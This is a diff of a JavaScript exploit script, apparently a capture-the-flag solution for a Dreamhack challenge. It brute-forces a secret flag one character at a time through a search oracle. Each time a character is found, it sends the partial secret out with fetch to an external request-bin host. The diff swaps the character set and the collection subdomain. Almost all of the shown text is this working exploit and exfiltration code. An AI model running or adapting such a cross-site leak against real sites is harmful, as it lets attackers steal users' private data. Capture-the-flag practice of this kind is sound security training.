@@ -32,7 +32,7 @@
             }
 
             async function exploit() {
-                let chars = "_abcdefghijklmnopqrstuvwxyz0123456789"
+                let chars = "abcdefghijklmnopqrstuvwxyz0123456789"
                 let secret_length = 36;
                 let secret = "DH{";
 
@@ -42,7 +42,7 @@
                     for (let c of chars) {
                         if (await search(secret + c)) {
                             secret += c;
-                            fetch(`https://rdftbhp.request.dreamhack.games?flag=${encodeURIComponent(secret)}`, {
+                            fetch(`https://mkezmac.request.dreamhack.games?flag=${encodeURIComponent(secret)}`, {
                                 mode: 'no-cors'
                             });
                             console.log(`found: ${secret}`);
